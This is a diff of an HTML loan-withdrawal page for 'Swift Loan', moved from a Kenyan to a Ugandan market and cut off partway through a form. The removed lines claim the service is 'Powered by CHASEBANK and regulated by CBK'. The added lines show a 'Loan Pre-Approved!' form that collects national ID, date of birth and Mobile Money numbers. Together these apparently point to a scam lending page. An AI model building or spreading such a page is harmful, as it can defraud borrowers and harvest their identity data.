@@ -1,22 +1,19 @@
 <!DOCTYPE html>
-<html lang="en-KE">
+<html lang="en-UG">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Loan Withdrawal | Swift Loan - Withdraw your approved loan</title>
-    <meta name="description" content="Withdraw your approved Swift Loan instantly. Secure loan disbursement process in Kenya.">
-    <link rel="icon" type="image/png" href="loan-logo.png">
-    <link rel="icon" sizes="192x192" href="loan-logo.png">
-    <link rel="icon" sizes="256x256" href="loan-logo.png">
-    <link rel="icon" sizes="512x512" href="loan-logo.png">
-    <link rel="shortcut icon" href="loan-logo.png">
-    <link rel="apple-touch-icon" href="swiftloan-logo.png">
-    <meta property="og:title" content="Loan Withdrawal - Swift Loan Kenya">
-    <meta property="og:description" content="Withdraw your approved loan instantly with Swift Loan Kenya.">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://swiftloan.ke/loan-withdrawal.html">
+    <title>Loan Withdrawal | Swift Loan - Complete Your Loan Request</title>
+    <meta name="description" content="Complete your loan withdrawal request with Swift Loan. Fast disbursement via Mobile Money in Uganda.">
     
+    <link rel="icon" type="image/png" href="swiftloan-logo.png">
+    <link rel="icon" sizes="192x192" href="swiftloan-logo.png">
+    <link rel="icon" sizes="256x256" href="swiftloan-logo.png">
+    <link rel="icon" sizes="512x512" href="swiftloan-logo.png">
+    <link rel="shortcut icon" href="swiftloan-logo.png">
+    <link rel="apple-touch-icon" href="swiftloan-logo.png">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -24,9 +21,9 @@
                 extend: {
                     colors: {
                         primary: '#FF6B00',
-                        'primary-dark': '#cc5600',
-                        'primary-light': '#fff3eb',
-                        'dark-blue': '#001F5C'
+                        'primary-dark': '#CC5500',
+                        'primary-light': '#FFF4ED',
+                        'swift-blue': '#001F5C'
                     }
                 }
             }
@@ -34,1096 +31,1073 @@
     </script>
     
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://unpkg.com/feather-icons@4.29.0/dist/feather.min.js"></script>
     
     <style>
-        html { scroll-behavior: smooth; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-orange: #FF6B00;
+            --primary-blue: #001F5C;
+            --light-gray: #F5F5F5;
+            --text-dark: #333;
+            --white: #FFFFFF;
+            --success-green: #10b981;
+            --error-red: #ef4444;
+        }
+
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #fff3eb 0%, #ffffff 50%, #f5f5f5 100%);
+            background: linear-gradient(135deg, #FFF4ED 0%, #ffffff 50%, #f0f9ff 100%);
             min-height: 100vh;
+            color: var(--text-dark);
+            line-height: 1.6;
         }
-        .swift-primary { color: #FF6B00; }
-        .swift-primary-bg { background-color: #FF6B00; }
-        .swift-primary-hover:hover { background-color: #cc5600; }
-        .swift-primary-light { background-color: #fff3eb; }
-        .swift-dark-blue { color: #001F5C; }
-        .swift-dark-blue-bg { background-color: #001F5C; }
-        .gradient-card {
-            background: linear-gradient(135deg, #ffffff 0%, #fff8f3 100%);
-            backdrop-filter: blur(10px);
+
+        header {
+            background: var(--white);
+            padding: 0.5rem 5%;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-        .shadow-swift {
-            box-shadow: 0 20px 40px -5px rgba(255, 107, 0, 0.15), 0 10px 20px -5px rgba(255, 107, 0, 0.1);
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1400px;
+            margin: 0 auto;
         }
-        .transition-swift { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        .pulse-ring { animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite; }
-        @keyframes pulse-ring {
-            0% { transform: scale(0.33); }
-            40%, 50% { opacity: 1; }
-            100% { opacity: 0; transform: scale(1.33); }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .bouncing-icon { animation: bounce-gentle 2s ease-in-out infinite; }
-        @keyframes bounce-gentle {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
+
+        .logo-img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
         }
-        .slide-in { animation: slideIn 0.8s cubic-bezier(0.23, 1, 0.320, 1) forwards; }
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(30px); }
+
+        .logo-text-container {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-main {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: var(--primary-blue);
+            line-height: 1.2;
+        }
+
+        .logo-main span {
+            color: var(--primary-orange);
+        }
+
+        .logo-tagline {
+            font-size: 0.5rem;
+            color: var(--primary-orange);
+            letter-spacing: 0.5px;
+        }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 0.6rem 1.2rem;
+            background: var(--primary-blue);
+            color: var(--white);
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 500;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: var(--primary-orange);
+            transform: translateY(-2px);
+        }
+
+        .main-container {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .page-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .page-header h1 {
+            color: var(--primary-blue);
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .page-header p {
+            color: #666;
+            font-size: 1rem;
+        }
+
+        .success-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
+            50% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+        }
+
+        .withdrawal-card {
+            background: var(--white);
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, var(--primary-blue), #003380);
+            color: var(--white);
+            padding: 1.5rem 2rem;
+        }
+
+        .card-header h2 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-body {
+            padding: 2rem;
+        }
+
+        .loan-amount-display {
+            text-align: center;
+            padding: 2rem;
+            background: linear-gradient(135deg, #FFF4ED 0%, #fff9f5 100%);
+            border-radius: 15px;
+            margin-bottom: 2rem;
+            border: 2px dashed var(--primary-orange);
+        }
+
+        .loan-amount-label {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .loan-amount-value {
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--primary-orange);
+            line-height: 1.2;
+        }
+
+        .loan-amount-value small {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        @media (max-width: 600px) {
+            .details-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .detail-item {
+            background: var(--light-gray);
+            padding: 1rem 1.2rem;
+            border-radius: 12px;
+            border-left: 4px solid var(--primary-orange);
+        }
+
+        .detail-item.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .detail-label {
+            font-size: 0.8rem;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 0.3rem;
+        }
+
+        .detail-value {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--primary-blue);
+            word-break: break-word;
+        }
+
+        .form-section {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-section h3 {
+            color: var(--primary-blue);
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--light-gray);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--primary-blue);
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+
+        .form-group label .required {
+            color: var(--error-red);
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            background: var(--white);
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--primary-orange);
+            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
+        }
+
+        .form-group input.valid {
+            border-color: var(--success-green);
+        }
+
+        .form-group input.error {
+            border-color: var(--error-red);
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .phone-input-wrapper:focus-within {
+            border-color: var(--primary-orange);
+            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
+        }
+
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 0 12px;
+            background: var(--light-gray);
+            border-right: 2px solid #e2e8f0;
+            font-weight: 600;
+            color: var(--primary-blue);
+            white-space: nowrap;
+        }
+
+        .uganda-flag {
+            width: 24px;
+            height: 16px;
+            background: linear-gradient(to bottom, 
+                #000 0%, #000 16.67%,
+                #FCDC04 16.67%, #FCDC04 33.33%,
+                #D90000 33.33%, #D90000 50%,
+                #000 50%, #000 66.67%,
+                #FCDC04 66.67%, #FCDC04 83.33%,
+                #D90000 83.33%, #D90000 100%);
+            border-radius: 2px;
+        }
+
+        .phone-input-wrapper input {
+            flex: 1;
+            border: none !important;
+            padding: 0.9rem 1rem;
+            font-size: 1rem;
+            outline: none;
+            box-shadow: none !important;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+        }
+
+        @media (max-width: 600px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .summary-box {
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border: 2px solid #86efac;
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .summary-box h4 {
+            color: #166534;
+            font-size: 1rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px dashed #86efac;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            font-weight: 700;
+            font-size: 1.1rem;
+            padding-top: 1rem;
+            margin-top: 0.5rem;
+            border-top: 2px solid #86efac;
+        }
+
+        .summary-row span:first-child {
+            color: #166534;
+        }
+
+        .summary-row span:last-child {
+            font-weight: 600;
+            color: var(--primary-blue);
+        }
+
+        .terms-box {
+            background: #fef3c7;
+            border: 1px solid #fcd34d;
+            border-radius: 10px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .terms-box p {
+            font-size: 0.85rem;
+            color: #92400e;
+            margin-bottom: 0.5rem;
+        }
+
+        .terms-box p:last-child {
+            margin-bottom: 0;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 1.5rem;
+            cursor: pointer;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            width: 22px;
+            height: 22px;
+            accent-color: var(--primary-orange);
+            cursor: pointer;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .checkbox-wrapper label {
+            font-size: 0.9rem;
+            color: #555;
+            cursor: pointer;
+            line-height: 1.5;
+        }
+
+        .checkbox-wrapper label a {
+            color: var(--primary-orange);
+            text-decoration: underline;
+        }
+
+        .withdraw-btn {
+            width: 100%;
+            padding: 1.2rem 2rem;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: var(--white);
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
+        }
+
+        .withdraw-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(37, 211, 102, 0.5);
+        }
+
+        .withdraw-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .withdraw-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .withdraw-btn svg {
+            width: 28px;
+            height: 28px;
+        }
+
+        .whatsapp-icon {
+            fill: white;
+        }
+
+        .security-note {
+            text-align: center;
+            margin-top: 1.5rem;
+            padding: 1rem;
+            background: var(--light-gray);
+            border-radius: 10px;
+        }
+
+        .security-note p {
+            font-size: 0.85rem;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            color: #666;
+            font-size: 0.85rem;
+        }
+
+        .error-message {
+            color: var(--error-red);
+            font-size: 0.85rem;
+            margin-top: 0.3rem;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .processing-animation { animation: processing 2s linear infinite; }
-        @keyframes processing {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        .withdrawal-card {
+            animation: fadeIn 0.5s ease-out;
         }
-        .shake { animation: shake 0.5s ease-in-out; }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
         }
-        .flowing-arrows { display: flex; align-items: center; gap: 4px; }
-        .arrow-flow { animation: arrow-flow 2s ease-in-out infinite; }
-        .arrow-flow:nth-child(2) { animation-delay: 0.3s; }
-        .arrow-flow:nth-child(3) { animation-delay: 0.6s; }
-        @keyframes arrow-flow {
-            0%, 100% { opacity: 0.3; transform: translateX(-5px) scale(0.8); }
-            50% { opacity: 1; transform: translateX(5px) scale(1.1); }
+
+        .loading-overlay.active {
+            display: flex;
         }
-        .modal-overlay { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(4px); }
-        .modal-content { animation: modalSlideIn 0.4s cubic-bezier(0.23, 1, 0.320, 1) forwards; }
-        @keyframes modalSlideIn {
-            from { opacity: 0; transform: translateY(50px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
+
+        .loading-content {
+            background: white;
+            padding: 3rem;
+            border-radius: 20px;
+            text-align: center;
         }
-        .form-field { transition: all 0.3s ease; }
-        .form-field:focus { border-color: #FF6B00; box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1); }
-        .form-field.error { border-color: #ef4444; box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1); }
-        .form-field.success { border-color: #10b981; box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1); }
-        .error-message { color: #ef4444; font-size: 0.875rem; margin-top: 0.25rem; }
-        .processing-overlay-enhanced {
-            background: linear-gradient(135deg, #FF6B00 0%, #cc5600 100%);
-            position: relative; overflow: hidden;
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #e2e8f0;
+            border-top-color: var(--primary-orange);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
         }
-        .processing-overlay-enhanced::before {
-            content: ''; position: absolute; top: 0; left: -100%;
-            width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            animation: shimmer 3s ease-in-out infinite;
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
-        @keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }
-        .legitimacy-indicator { animation: pulse 2s ease-in-out infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
-        @media (max-width: 768px) {
-            .hero-title { font-size: 2rem; line-height: 1.2; }
-            .modal-content { margin: 1rem; width: calc(100% - 2rem); }
+
+        .no-data-message {
+            text-align: center;
+            padding: 3rem;
         }
-        .error-state { background: linear-gradient(135deg, #fee2e2 0%, #fef2f2 100%); border: 1px solid #fecaca; }
-        .success-state { background: linear-gradient(135deg, #dcfce7 0%, #f0fdf4 100%); border: 1px solid #bbf7d0; }
-        #successAlert, #errorAlert { scroll-margin-top: 90px; }
-        .method-card { transition: all 0.3s ease; cursor: pointer; border: 2px solid transparent; }
-        .method-card:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        .method-card.selected { border-color: #FF6B00; background: linear-gradient(135deg, #fff3eb 0%, #ffe8d6 100%); }
-        .progress-bar-animated { background: linear-gradient(45deg, #10b981, #34d399); animation: progressFill 3s ease-in-out forwards; }
-        @keyframes progressFill { 0% { width: 0%; } 100% { width: 100%; } }
-        @media print {
-            body * { visibility: hidden !important; }
-            #receiptCardContainer, #receiptCardContainer * { visibility: visible !important; }
-            #receiptCardContainer { margin: 0 auto; padding: 20px !important; width: 100% !important; max-width: 800px; border: 1px solid #000; box-shadow: none !important; }
-            #receiptCardContainer .print\:flex { display: flex !important; }
-            #receiptCardContainer h2, #receiptCardContainer h1 { font-size: 18pt !important; color: #000 !important; }
-            #receiptCardContainer p, #receiptCardContainer span { font-size: 11pt !important; color: #000 !important; }
-            #receiptCardContainer a, #receiptCardContainer button { display: none !important; }
+
+        .no-data-message h2 {
+            color: var(--primary-blue);
+            margin-bottom: 1rem;
+        }
+
+        .no-data-message a {
+            display: inline-block;
+            margin-top: 1rem;
+            padding: 0.8rem 2rem;
+            background: var(--primary-orange);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 600;
         }
     </style>
-    <script>
-        (function(d, w, c) {
-            w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
-            w[c] = w[c] || function() { (w[c].q = w[c].q || []).push(arguments); };
-            var s = d.createElement('script');
-            s.async = true;
-            s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
-            if (d.head) d.head.appendChild(s);
-        })(document, window, 'BrevoConversations');
-    </script>
 </head>
-<body class="bg-gradient-to-br from-orange-50 via-white to-gray-100">
-    <header class="bg-white/80 backdrop-blur-md shadow-sm border-b border-gray-100 sticky top-0 z-50">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div class="flex justify-between items-center h-16">
-                <div class="flex-shrink-0">
-                    <div class="flex items-center">
-                        <div class="w-10 h-10 swift-primary-bg rounded-lg flex items-center justify-center">
-                            <svg class="text-white" fill="currentColor" height="20" width="20" viewBox="0 0 24 24">
-                                <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 10H5V9h16v8z"/>
-                                <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 7l-2 2V3h-2z"/>
-                                <circle cx="17" cy="13" r="1"/>
-                            </svg>
-                        </div>
-                        <span class="ml-3 text-xl font-bold swift-dark-blue">Swift Loan Wallet</span>
-                    </div>
+<body>
+    <header>
+        <div class="header-content">
+            <a href="index.html" class="logo-section" style="text-decoration: none;">
+                <img src="swiftloan-logo.png" alt="Swift Loan Logo" class="logo-img" onerror="this.style.display='none'">
+                <div class="logo-text-container">
+                    <div class="logo-main">Swift<span>Loan</span></div>
+                    <div class="logo-tagline">QUICK & EASY LOANS</div>
                 </div>
-                <div class="flex items-center space-x-3">
-                    <button onclick="goBack()" class="border border-primary text-primary hover:bg-primary hover:bg-opacity-10 px-4 py-2 text-sm font-medium rounded-md transition-swift">
-                        <i class="fas fa-arrow-left mr-1"></i>
-                    </button>
-                </div>
-            </div>
+            </a>
+            <a href="offers.html" class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="19" y1="12" x2="5" y2="12"></line>
+                    <polyline points="12 19 5 12 12 5"></polyline>
+                </svg>
+                Back to Offers
+            </a>
         </div>
     </header>
 
-    <main class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
-        <div class="text-center mb-8 slide-in">
-            <div class="inline-flex items-center px-4 py-2 bg-green-100 text-green-800 rounded-full text-sm font-medium mb-6">
-                <i class="fas fa-check-circle mr-2"></i>
-                Loan Transfer to wallet was Successful & Ready for Withdrawal.
-                Powered by CHASEBANK and regulated by CBK. Account number: [DDQTSU]
+    <main class="main-container">
+        <div class="page-header">
+            <div class="success-badge">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                </svg>
+                Loan Pre-Approved!
             </div>
-            <h1 class="hero-title text-3xl lg:text-4xl font-bold swift-dark-blue leading-tight mb-4">
-                Withdraw Your <span class="swift-primary">Loan Funds Instantly</span>
-            </h1>
-            <p class="text-lg text-gray-600 max-w-2xl mx-auto">
-                Your loan has been approved and is ready for instant withdrawal. Contact our support team through the blue chat button at the bottom right. We are always online 24/7.
-            </p>
+            <h1>Complete Your Withdrawal</h1>
+            <p>Fill in your details to receive your loan via Mobile Money</p>
         </div>
 
-        <div id="errorAlert" class="hidden mb-8 error-state rounded-2xl p-6 slide-in">
-            <div class="flex items-start space-x-3">
-                <i class="fas fa-exclamation-triangle text-red-600 text-xl mt-0.5 flex-shrink-0"></i>
-                <div>
-                    <h3 class="text-lg font-semibold text-red-800 mb-2">Transaction Failed</h3>
-                    <p id="errorMessage" class="text-red-700 text-sm"></p>
-                    <button onclick="hideError()" class="mt-3 text-red-600 hover:text-red-800 text-sm font-medium underline">Dismiss</button>
-                </div>
-            </div>
-        </div>
-
-        <div id="successAlert" class="hidden mb-8 success-state rounded-2xl p-6 slide-in bg-green-100 border border-green-300">
-            <div class="flex items-start space-x-3">
-                <i class="fas fa-check-circle text-green-600 text-xl mt-0.5 flex-shrink-0"></i>
-                <div class="w-full">
-                    <h3 id="successHeading" class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successfully Initiated!</h3>
-                    <p id="successMessage" class="text-green-700 text-sm mb-3"></p>
-                    <div class="w-full bg-gray-200 rounded-full h-5 overflow-hidden relative mb-4">
-                        <div id="progressBar" class="bg-green-600 h-5 w-0 transition-all duration-200"></div>
-                        <span id="progressText" class="absolute inset-0 flex items-center justify-center text-xs font-medium text-white">
-                            Processing withdrawal...
-                        </span>
+        <div id="mainContent">
+            <form id="withdrawalForm">
+                <div class="withdrawal-card">
+                    <div class="card-header">
+                        <h2>
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                                <line x1="1" y1="10" x2="23" y2="10"></line>
+                            </svg>
+                            Loan Details
+                        </h2>
                     </div>
-                    <div id="receiptCardContainer" class="mt-6"></div>
-                    <div class="text-center mt-4">
-                        <button onclick="openHelpModal()" class="text-sm font-medium swift-dark-blue hover:text-primary underline">
-                            Need help? Verify Transaction
+                    <div class="card-body">
+                        <div class="loan-amount-display">
+                            <div class="loan-amount-label">Your Approved Loan Amount</div>
+                            <div class="loan-amount-value"><small>UGX</small> <span id="displayLoanAmount">0</span></div>
+                        </div>
+
+                        <div class="details-grid">
+                            <div class="detail-item">
+                                <div class="detail-label">Interest Rate</div>
+                                <div class="detail-value" id="displayInterestRate">-</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Processing Fee</div>
+                                <div class="detail-value" id="displayProcessingFee">-</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Repayment Period</div>
+                                <div class="detail-value" id="displayRepaymentPeriod">-</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">Due Date</div>
+                                <div class="detail-value" id="displayDueDate">-</div>
+                            </div>
+                            <div class="detail-item full-width">
+                                <div class="detail-label">Total Repayment Amount</div>
+                                <div class="detail-value" id="displayTotalRepayment" style="color: var(--primary-orange); font-size: 1.3rem;">-</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="withdrawal-card">
+                    <div class="card-header" style="background: linear-gradient(135deg, var(--primary-orange), #CC5500);">
+                        <h2>
+                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                <circle cx="12" cy="7" r="4"></circle>
+                            </svg>
+                            Your Personal Details
+                        </h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="form-section">
+                            <h3>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                    <circle cx="12" cy="7" r="4"></circle>
+                                </svg>
+                                Personal Information
+                            </h3>
+                            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="firstName">First Name <span class="required">*</span></label>
+                                    <input type="text" id="firstName" name="firstName" placeholder="Enter your first name" required>
+                                    <div class="error-message" id="firstNameError">Please enter your first name</div>
+                                </div>
+                                <div class="form-group">
+                                    <label for="lastName">Last Name <span class="required">*</span></label>
+                                    <input type="text" id="lastName" name="lastName" placeholder="Enter your last name" required>
+                                    <div class="error-message" id="lastNameError">Please enter your last name</div>
+                                </div>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="nationalId">National ID Number <span class="required">*</span></label>
+                                <input type="text" id="nationalId" name="nationalId" placeholder="e.g. CM12345678ABCDE" required>
+                                <div class="error-message" id="nationalIdError">Please enter a valid National ID number</div>
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label for="dateOfBirth">Date of Birth <span class="required">*</span></label>
+                                    <input type="date" id="dateOfBirth" name="dateOfBirth" required>
+                                    <div class="error-message" id="dateOfBirthError">Please enter your date of birth</div>
+                                </div>
+                                <div class="form-group">
+                                    <label for="gender">Gender <span class="required">*</span></label>
+                                    <select id="gender" name="gender" required>
+                                        <option value="">Select Gender</option>
+                                        <option value="Male">Male</option>
+                                        <option value="Female">Female</option>
+                                    </select>
+                                    <div class="error-message" id="genderError">Please select your gender</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-section">
+                            <h3>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                                </svg>
+                                Mobile Money Details
+                            </h3>
+
+                            <div class="form-group">
+                                <label for="phoneNumber">Mobile Money Phone Number <span class="required">*</span></label>
+                                <div class="phone-input-wrapper">
+                                    <div class="phone-prefix">
+                                        <div class="uganda-flag"></div>
+                                        <span>+256</span>
+                                    </div>
+                                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="7XX XXX XXX" maxlength="9" required>
+                                </div>
+                                <div class="error-message" id="phoneNumberError">Please enter a valid Ugandan phone number (9 digits)</div>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="mobileNetwork">Mobile Network <span class="required">*</span></label>
+                                <select id="mobileNetwork" name="mobileNetwork" required>
+                                    <option value="">Select Network</option>
+                                    <option value="MTN Mobile Money">MTN Mobile Money</option>
+                                    <option value="Airtel Money">Airtel Money</option>
+                                </select>
+                                <div class="error-message" id="mobileNetworkError">Please select your mobile network</div>
+                            </div>
+                        </div>
+
+                        <div class="form-section">
+                            <h3>
